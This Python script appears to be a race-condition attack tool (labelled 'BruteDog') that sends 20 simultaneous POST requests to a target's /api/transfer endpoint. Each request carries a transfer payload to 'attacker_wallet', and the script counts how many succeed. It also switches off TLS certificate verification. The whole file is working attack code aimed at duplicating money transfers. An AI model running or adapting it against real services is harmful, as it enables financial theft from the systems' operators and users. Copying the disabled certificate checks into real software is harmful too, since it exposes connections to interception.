#!/usr/bin/env python3
"""
RACE_CONDITION.PY — High-Concurrency API Logic & Race Condition Fuzzing Engine
Features:
- Simultaneous HTTP request dispatch using asyncio.gather
- Response anomaly and state-drift detection across parallel threads
- Zero-disk live terminal streaming
"""
import asyncio
import http.client
import json
import ssl
import time
import sys
from urllib.parse import urlsplit

REQUEST_TIMEOUT = 10

def log(msg, color="\033[92m"):
    sys.stdout.write(f"{color}{msg}\033[0m\n")
    sys.stdout.flush()

def fire_single_request(host, port, path, payload, secure):
    conn = None
    start = time.monotonic()
    try:
        if secure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=REQUEST_TIMEOUT, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=REQUEST_TIMEOUT)
            
        body = json.dumps(payload).encode("utf-8") if payload else b""
        headers = {
            "User-Agent": "BruteDog-RaceCondition/5.4",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Connection": "close"
        }
        conn.request("POST" if payload else "GET", path, body=body if payload else None, headers=headers)
        res = conn.getresponse()
        data = res.read(64 * 1024).decode("utf-8", errors="replace")
        elapsed = round(time.monotonic() - start, 3)
        return {"status": res.status, "body": data, "elapsed": elapsed}
    except Exception as exc:
        return {"status": 0, "body": str(exc), "elapsed": 0}
    finally:
        if conn:
            conn.close()

async def run_race_condition_test(target_host, port=None, use_ssl=None):
    log("\n[***] INITIALIZING HIGH-CONCURRENCY RACE CONDITION ENGINE [***]", "\033[95m")
    parsed = urlsplit(target_host if "://" in target_host else f"https://{target_host}")
    host = parsed.hostname
    secure = parsed.scheme == "https"
    target_port = port or parsed.port or (443 if secure else 80)
    base_path = parsed.path.rstrip("/")
    
    test_endpoint = base_path + "/api/transfer" if base_path else "/api/transfer"
    test_payload = {"amount": 100, "recipient": "attacker_wallet"}
    
    log(f"[*] Firing 20 simultaneous parallel threads against: {test_endpoint}", "\033[94m")
    
    # Fire 20 requests completely simultaneously
    tasks = [
        asyncio.to_thread(fire_single_request, host, target_port, test_endpoint, test_payload, secure)
        for _ in range(20)
    ]
    
    results = await asyncio.gather(*tasks)
    
    success_count = sum(1 for r in results if r["status"] in (200, 201))
    log(f"[+] Concurrency test complete. Parallel success responses: {success_count}/20", "\033[92m")
    
    return results
